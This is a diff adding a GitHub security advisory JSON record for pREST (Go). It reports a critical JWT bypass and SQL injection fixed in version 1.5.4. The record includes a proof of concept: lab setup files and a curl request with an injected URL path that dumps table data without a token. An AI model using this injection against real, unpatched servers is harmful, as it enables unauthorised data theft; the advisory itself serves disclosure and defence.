@@ -1,0 +1,70 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-wm25-j4gw-6vr3",
+  "modified": "2024-08-07T14:16:28Z",
+  "published": "2024-07-30T15:04:26Z",
+  "aliases": [
+
+  ],
+  "summary": "pREST vulnerable to jwt bypass + sql injection",
+  "details": "### Summary\nProbably jwt bypass + sql injection\nor what i'm doing wrong?\n\n### PoC (how to reproduce)\n\n1. Create following files:\n\ndocker-compose.yml:\n```\nservices:\n  postgres:\n    image: postgres\n    container_name: postgres_container_mre\n    environment:\n      POSTGRES_USER: test_user_pg\n      POSTGRES_PASSWORD: test_pass_pg\n      POSTGRES_DB: test_db\n  prest:\n    image: prest/prest\n    build: .\n    volumes:\n      - ./queries:/queries\n      - ./migrations:/migrations\n    ports:\n      - \"3000:3000\"\n```\n\nDockerfile:\n```\nfrom prest/prest:latest\n\nCOPY ./prest.toml prest.toml\n```\n\nprest.toml:\n```\ndebug=false\nmigrations = \"./migrations\"\n\n[http]\nport = 3000\n\n[jwt]\ndefault = true\nkey = \"secret\"\nalgo = \"HS256\"\n\n[auth]\nenabled = true\ntype = \"body\"\nencrypt = \"MD5\"\ntable = \"prest_users\"\nusername = \"username\"\npassword = \"password\"\n\n[pg]\nURL = \"postgresql://test_user_pg:test_pass_pg@postgres:5432/test_db/?sslmode=disable\"\n\n[ssl]\nmode = \"disable\"\nsslcert = \"./PATH\"\nsslkey = \"./PATH\"\nsslrootcert = \"./PATH\"\n\n[expose]\nenabled = true\ndatabases = true\nschemas = true\ntables = true\n\n[queries]\nlocation = \"/queries\"\n```\n\n\n2. run commands:\n\n```\nmkdir -p migrations queries\ndocker compose up --build -d\n```\nwait for pg and prest, then run following to add test data to the pg:\n\n```\nexport PGPASSWORD=test_pass_pg\ndocker exec -it postgres_container_mre psql -U test_user_pg -d test_db -c \"CREATE TABLE IF NOT EXISTS public.some_table (id int primary key, secret_data text);\\\nINSERT INTO public.some_table (id, secret_data) VALUES (1, 'some secret text') ON CONFLICT DO NOTHING;\"\n```\n\n3. SQL injection even without jwt token:\n```\ncurl --location '127.0.0.1:3000/test_db/public\".some_table)%20s;--/auth'\n```\noutput:\n```\n[{\"id\": 1, \"secret_data\": \"some secret text\"}]\n```\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/prest/prest"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/prest/prest"
+    },
+    {
+      "type": "WEB",
+      "url": "https://pkg.go.dev/vuln/GO-2024-3011"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-287",
+      "CWE-89"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-30T15:04:26Z",
+    "nvd_published_at": null
+  }
+}
